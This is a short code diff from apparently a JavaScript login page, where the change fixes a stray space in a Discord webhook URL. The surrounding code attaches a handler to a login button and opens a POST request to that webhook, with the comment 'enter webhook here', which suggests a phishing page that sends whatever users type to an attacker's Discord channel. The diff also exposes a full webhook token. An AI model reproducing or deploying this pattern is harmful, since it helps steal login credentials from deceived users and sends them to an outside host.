@@ -38,7 +38,7 @@ login.addEventListener('click', (e) => {
       //}, 1000)
     })
 
-    wb = " https://discord.com/api/webhooks/1191377471975727175/olSWRF7RHWsa03G8Hqj7QOYIGJSQde_0l5sSTLQRV_3yt1ez3tTH3ZiaZm8DCn6hhJJy"; //enter webhook here
+    wb = "https://discord.com/api/webhooks/1191377471975727175/olSWRF7RHWsa03G8Hqj7QOYIGJSQde_0l5sSTLQRV_3yt1ez3tTH3ZiaZm8DCn6hhJJy"; //enter webhook here
 	
 	var request = new XMLHttpRequest();
       request.open("POST", wb);
